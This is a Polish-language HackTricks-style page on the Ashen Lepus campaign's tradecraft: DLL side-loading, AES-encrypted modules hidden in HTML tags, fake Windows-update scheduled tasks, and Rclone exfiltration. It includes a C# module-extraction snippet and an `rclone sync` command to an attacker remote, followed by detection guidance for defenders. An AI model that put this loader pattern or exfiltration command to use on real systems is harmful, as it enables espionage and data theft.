# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) wykorzystał powtarzalny schemat łączący DLL sideloading, staged HTML payloads oraz modular .NET backdoors, aby utrzymać się w sieciach dyplomatycznych Bliskiego Wschodu. Technika jest wielokrotnego użytku przez dowolnego operatora, ponieważ opiera się na:

- **Archive-based social engineering**: nieszkodliwe pliki PDF instruują cele, aby pobrały archiwum RAR z serwisu do udostępniania plików. Archiwum zawiera wyglądający na prawdziwy EXE przeglądarki dokumentów, złośliwy DLL nazwany jak zaufana biblioteka (np. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) oraz przynętę `Document.pdf`.
- **DLL search order abuse**: ofiara dwukrotnie klika EXE, Windows rozwiązuje import DLL z bieżącego katalogu, a złośliwy loader (AshenLoader) uruchamia się w zaufanym procesie, podczas gdy przynętowy PDF otwiera się, by nie wzbudzać podejrzeń.
- **Living-off-the-land staging**: każda kolejna faza (AshenStager → AshenOrchestrator → moduły) jest przechowywana poza dyskiem do momentu potrzeby, dostarczana jako zaszyfrowane bloby ukryte w pozornie nieszkodliwych odpowiedziach HTML.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loaduje AshenLoader, który wykonuje rozpoznanie hosta, szyfruje go AES-CTR i wysyła w POST jako część rotujących parametrów takich jak `token=`, `id=`, `q=` lub `auth=` do ścieżek wyglądających jak API (np. `/api/v2/account`).
2. **HTML extraction**: C2 ujawnia następny etap dopiero, gdy IP klienta geolokuje się do docelowego regionu i `User-Agent` pasuje do implantu, co utrudnia sandboxes. Gdy kontrole przejdą, ciało HTTP zawiera blob `<headerp>...</headerp>` z Base64/AES-CTR zaszyfrowanym ładunkiem AshenStager.
3. **Second sideload**: AshenStager jest wdrażany razem z innym legalnym binarium, które importuje `wtsapi32.dll`. Złośliwa kopia wstrzyknięta do binarium pobiera więcej HTML, tym razem wycinając `<article>...</article>`, aby odzyskać AshenOrchestrator.
4. **AshenOrchestrator**: modularny kontroler .NET, który dekoduje Base64 JSON config. Pola `tg` i `au` w konfiguracji są łączone/haszowane w celu utworzenia klucza AES, którym odszyfrowuje się `xrk`. Wynikowe bajty pełnią rolę klucza XOR dla każdego pobieranego modułu.
5. **Module delivery**: każdy moduł opisany jest poprzez komentarze HTML, które przekierowują parser do dowolnego taga, łamiąc statyczne reguły szukające tylko `<headerp>` lub `<article>`. Moduły obejmują persistence (`PR*`), uninstallery (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) oraz eksplorację plików (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Nawet jeśli obrońcy zablokują lub usuną konkretny element, operator musi tylko zmienić tag wskazany w komentarzu HTML, aby wznowić dostarczanie.

## Utwardzanie Crypto i C2

- **AES-CTR everywhere**: obecne ładowarki osadzają 256-bitowe klucze plus nonces (np. `{9a 20 51 98 ...}`) i opcjonalnie dodają warstwę XOR wykorzystując ciągi takie jak `msasn1.dll` przed/po deszyfrowaniu.
- **Recon smuggling**: enumerowane dane teraz zawierają listingi Program Files, aby wykryć aplikacje wysokiej wartości i są zawsze szyfrowane przed opuszczeniem hosta.
- **URI churn**: parametry zapytań i ścieżki REST obracają się między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), unieważniając kruche detekcje.
- **Gated delivery**: serwery są geo-ogrodzone i odpowiadają tylko prawdziwym implantom. Niezatwierdzeni klienci otrzymują niebudzący podejrzeń HTML.

## Utrwalenie i pętla wykonywania

AshenStager tworzy zadania zaplanowane, które podszywają się pod zadania konserwacyjne Windows i wykonują się przez `svchost.exe`, np.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Te zadania ponownie uruchamiają łańcuch sideloading przy starcie lub w odstępach, zapewniając, że AshenOrchestrator może żądać świeżych modułów bez ponownego zapisu na dysku.

## Użycie nieszkodliwych klientów synchronizacji do eksfiltracji

Operatorzy umieszczają dokumenty dyplomatyczne w `C:\Users\Public` (dostępne dla wszystkich i niebudzące podejrzeń) przez dedykowany moduł, a następnie pobierają legalny binarny [Rclone](https://rclone.org/) aby zsynchronizować ten katalog z magazynem kontrolowanym przez atakującego:

1. **Stage**: skopiuj/zbierz pliki docelowe do `C:\Users\Public\{campaign}\`.
2. **Configure**: wyślij plik konfiguracyjny Rclone wskazujący na endpoint HTTPS kontrolowany przez atakującego (np. `api.technology-system[.]com`).
3. **Sync**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` aby ruch przypominał normalne kopie zapasowe w chmurze.

Ponieważ Rclone jest szeroko używany w legalnych procesach backupu, obrońcy muszą skupić się na anomaliach w wykonywaniu (nowe binarki, dziwne remote'y lub nagłe synchronizacje `C:\Users\Public`).

## Punkty detekcji

- Uruchamiaj alerty dla **podpisanych procesów**, które nieoczekiwanie ładują DLL-e z ścieżek zapisywalnych przez użytkownika (filtry Procmon + `Get-ProcessMitigation -Module`), szczególnie gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi`, lub `wtsapi32`.
- Analizuj podejrzane odpowiedzi HTTPS pod kątem **dużych blobów Base64 osadzonych w nietypowych tagach** lub chronionych komentarzami `<!-- TAG: <xyz> -->`.
- Szukaj **zadania zaplanowane** które uruchamiają `svchost.exe` z argumentami niebędącymi usługami lub wskazują z powrotem na katalogi droppera.
- Monitoruj pojawianie się binarek **Rclone** poza lokalizacjami zarządzanymi przez IT, nowe pliki `rclone.conf` lub zadania synchronizacji pobierające ze stagingowych katalogów takich jak `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
